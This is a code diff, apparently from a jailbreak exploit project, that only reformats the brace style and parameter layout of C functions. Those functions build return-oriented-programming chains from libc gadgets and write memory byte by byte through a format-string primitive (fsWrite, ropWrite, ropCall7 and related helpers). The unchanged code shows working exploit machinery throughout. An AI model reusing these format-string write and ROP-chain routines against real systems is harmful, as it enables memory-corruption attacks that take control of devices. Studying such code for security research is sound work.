@@ -63,8 +63,7 @@ unsigned int varsWritten = 0;
 short fsgetPadding(unsigned char data)
 {
     int i, v = 1;
-    for (i = 0; i < 10; i++)
-    {
+    for (i = 0; i < 10; i++) {
         v = v * 10;
         if (lines < v)
             break;
@@ -86,17 +85,14 @@ void setP3Data(unsigned int data)
     // The idea is to change p2Data lowest byte to p3AddrLo, p3AddrLo+1, p3AddrLo+2, p3AddrLo+3.
     // This way, 'data' is written to p3Data, byte per byte.
     unsigned int p3ByteAddr, i = 0;
-    for (p3ByteAddr = p3AddrLo; p3ByteAddr < p3AddrLo + 4; p3ByteAddr++)
-    {
+    for (p3ByteAddr = p3AddrLo; p3ByteAddr < p3AddrLo + 4; p3ByteAddr++) {
         unsigned char p3DataByte = (data >> (i * 8)) & 0xff;
         unsigned int p3DataOr = p3DataByte << (i * 8);
         unsigned int p3DataMask = 0xff << (i * 8);
 
-        if (firstP3Write || (p3Data & p3DataMask) != p3DataOr)
-        {
+        if (firstP3Write || (p3Data & p3DataMask) != p3DataOr) {
             unsigned char newP2DataLo = p3ByteAddr & 0xff;
-            if (firstP2Write || p2DataLo != newP2DataLo)
-            {
+            if (firstP2Write || p2DataLo != newP2DataLo) {
                 fswriteByte(P1, newP2DataLo);
                 p2DataLo = newP2DataLo; // this is the operation we're doing to p2Data
                 firstP2Write = 0;
@@ -117,8 +113,7 @@ void setP3DataEx(unsigned char p3AddrLo, unsigned int data)
     // The idea is to change p2Data lowest byte to p3AddrLo, p3AddrLo+1, p3AddrLo+2, p3AddrLo+3.
     // This way, 'data' is written to p3Data, byte per byte.
     unsigned int p3ByteAddr, i = 0;
-    for (p3ByteAddr = p3AddrLo; p3ByteAddr < p3AddrLo + 4; p3ByteAddr++)
-    {
+    for (p3ByteAddr = p3AddrLo; p3ByteAddr < p3AddrLo + 4; p3ByteAddr++) {
         unsigned char p3DataByte = (data >> (i * 8)) & 0xff;
         unsigned char newP2DataLo = p3ByteAddr & 0xff;
         fswriteByte(P1, newP2DataLo);
@@ -139,24 +134,17 @@ void fsWriteAddrRel(unsigned char addrLo, unsigned int data) { setP3DataEx(addrL
 void ropWrite(unsigned int value)
 {
     // fprintf(stderr, "0x%08x: 0x%08x", ropWriteAddr, value);
-    if (ropWriteMode == ROP_MODE_MEM)
-    {
-        if (value == USELESS || value == PLACE_HOLDER)
-        {
+    if (ropWriteMode == ROP_MODE_MEM) {
+        if (value == USELESS || value == PLACE_HOLDER) {
             ropWriteAddr += 4;
-        }
-        else
-        {
+        } else {
             fsWrite(ropWriteAddr++, value & 0xff);
             fsWrite(ropWriteAddr++, (value >> 8) & 0xff);
             fsWrite(ropWriteAddr++, (value >> 16) & 0xff);
             fsWrite(ropWriteAddr++, (value >> 24) & 0xff);
         }
-    }
-    else
-    {
-        if (ropFile == NULL)
-        {
+    } else {
+        if (ropFile == NULL) {
             ropFile = fopen(ROP_FILE_NAME, "wb");
             ropFileAddr = ropWriteAddr;
         }
@@ -170,20 +158,15 @@ void ropWrite(unsigned int value)
 
 void ropWriteVars()
 {
-    if (ropWriteVarsMode == ROP_MODE_MEM)
-    {
+    if (ropWriteVarsMode == ROP_MODE_MEM) {
         unsigned int i;
         Addr addr = varsBaseAddr;
-        for (i = 0; i < varsWritten; i++)
-        {
+        for (i = 0; i < varsWritten; i++) {
             fsWrite(addr, vars[i]);
             addr++;
         }
-    }
-    else
-    {
-        if (ropVarsFile == NULL)
-        {
+    } else {
+        if (ropVarsFile == NULL) {
             ropVarsFile = fopen(VARS_FILE_NAME, "wb");
         }
         fwrite(vars, 1, varsWritten, ropVarsFile);
@@ -244,8 +227,7 @@ Addr newArray(unsigned int values[], unsigned int count)
 
     int i;
     Addr ret = 0;
-    for (i = 0; i < count; i++)
-    {
+    for (i = 0; i < count; i++) {
         Addr tmp = newInteger(values[i]);
         if (ret == 0)
             ret = tmp;
@@ -450,8 +432,15 @@ void ropCall4Reg(Addr addr)
     ropWrite(USELESS);                     // 0x18 r7
 }
 
-void ropCall7(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4,
-              unsigned int p5, unsigned int p6, unsigned int p7)
+void ropCall7(
+    Addr addr,
+    unsigned int p1,
+    unsigned int p2,
+    unsigned int p3,
+    unsigned int p4,
+    unsigned int p5,
+    unsigned int p6,
+    unsigned int p7)
 {
     ropWrite(dscs + LIBC_POP_R0123); // 0x00 pc
     ropWrite(p1);                    // 0x04 r0
@@ -461,19 +450,30 @@ void ropCall7(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsi
     ropLoadReg4Const(addr);
     ropWrite(dscs + LIBC_BLX_R4_POP_R457); // 0x20 pc		// pod2g: I guess this gadget has to
                                            // be changed
-    ropWrite(p5); // 0x24 r4 (and p5)
-    ropWrite(p6); // 0x28 r5 (and p6)
-    ropWrite(p7); // 0x2c r7 (and p7)
+    ropWrite(p5);                          // 0x24 r4 (and p5)
+    ropWrite(p6);                          // 0x28 r5 (and p6)
+    ropWrite(p7);                          // 0x2c r7 (and p7)
 }
 
-void ropCall6(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4,
-              unsigned int p5, unsigned int p6)
+void ropCall6(
+    Addr addr,
+    unsigned int p1,
+    unsigned int p2,
+    unsigned int p3,
+    unsigned int p4,
+    unsigned int p5,
+    unsigned int p6)
 {
     ropCall7(addr, p1, p2, p3, p4, p5, p6, USELESS);
 }
 
-void ropCall5(Addr addr, unsigned int p1, unsigned int p2, unsigned int p3, unsigned int p4,
-              unsigned int p5)
+void ropCall5(
+    Addr addr,
+    unsigned int p1,
+    unsigned int p2,
+    unsigned int p3,
+    unsigned int p4,
+    unsigned int p5)
 {
     ropCall6(addr, p1, p2, p3, p4, p5, USELESS);
 }
